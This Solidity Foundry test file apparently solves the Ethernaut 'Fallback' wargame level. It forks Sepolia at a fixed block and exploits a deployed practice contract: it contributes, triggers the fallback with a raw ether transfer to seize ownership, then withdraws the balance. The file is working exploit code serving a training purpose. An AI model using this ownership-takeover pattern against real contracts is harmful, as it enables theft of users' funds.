// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {FallbackContract} from "../src/Fallback.sol";

contract FallbackTest is Test {
    FallbackContract public fallbackContract;

    function setUp() public {
        uint256 forkId = vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6592383);
    }

    function test_Withdraw() public {
        fallbackContract = FallbackContract(payable(address(0x91ed60C2c7c8308CDc14Eeb329c0e43B977F877d)));

        fallbackContract.contribute{value: 0.0001 ether}();

        console.log(fallbackContract.getContribution());

        payable(address(fallbackContract)).call{value: 0.0001 ether}("");

        fallbackContract.withdraw();

        console.log(address(fallbackContract).balance);

        console.log(fallbackContract.owner());
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {
    
    }

}
